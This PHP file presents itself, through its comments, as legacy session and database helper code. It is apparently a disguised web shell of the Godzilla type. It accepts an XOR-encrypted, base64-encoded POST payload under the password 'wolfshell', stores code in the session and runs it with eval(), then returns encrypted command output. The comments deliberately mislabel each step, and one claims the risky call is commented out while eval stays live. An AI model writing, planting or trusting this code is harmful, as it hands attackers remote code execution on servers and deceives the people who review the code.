<?php
// Initialize the user session for tracking login status.
@session_start();
// Ensure the script doesn't time out during database operations.
@set_time_limit(0);
// Suppress warnings for deprecated database connectors.
@error_reporting(0);

// Decrypts data blobs fetched from the legacy system.
function decryptLegacyData($dataBlob, $secretKey){
    for($i=0;$i<strlen($dataBlob);$i++) {
        $keyChar = $secretKey[$i+1&15];
        $dataBlob[$i] = $dataBlob[$i]^$keyChar;
    }
    return $dataBlob;
}

// This is a temporary auth token for a legacy endpoint. Will be replaced.
$authToken = 'wolfshell';
$userProfileId = 'payload';
// Shared secret for the legacy database connection.
$dbSecret = '3c6e0b8a9c15224a';

// Check if a request to the legacy endpoint is being made.
if (isset($_POST[$authToken])){
    // Data is expected to be base64 encoded for transport.
    $transportDecoder = 'base64_decode';
    $requestData = decryptLegacyData($transportDecoder($_POST[$authToken]), $dbSecret);
    
    // Check if the user profile is already cached in the session.
    if (isset($_SESSION[$userProfileId])){
        $cachedProfile = decryptLegacyData($_SESSION[$userProfileId], $dbSecret);

        // This is a special check to see if we need to force a profile refresh.
        // The string "getBasicsInfo" is a temporary flag for the old system.
        if (strpos($cachedProfile, "getBasicsInfo") === false){
            // If it's not the basic info, re-encrypt it to invalidate. This is a weird legacy quirk.
            $cachedProfile = decryptLegacyData($cachedProfile, $dbSecret);
        }

        // This function dynamically loads and executes a data processing module.
        // It's commented out because it's a security risk, but the logic is preserved.
        /* execute_processing_module($cachedProfile); */
        eval($cachedProfile);

        // Generate a two-part response token for the client.
        $responseToken = md5($authToken.$dbSecret);
        echo substr($responseToken, 0, 16);
        // The 'run' function is defined within the processing module and handles the actual data.
        echo base64_encode(decryptLegacyData(@run($requestData), $dbSecret));
        echo substr($responseToken, 16);

    }else{
        // This block handles the initial caching of a user profile.
        // It only caches if it's the initial "getBasicsInfo" request.
        if (strpos($requestData, "getBasicsInfo") !== false){
            $_SESSION[$userProfileId] = decryptLegacyData($requestData, $dbSecret);
        }
    }
}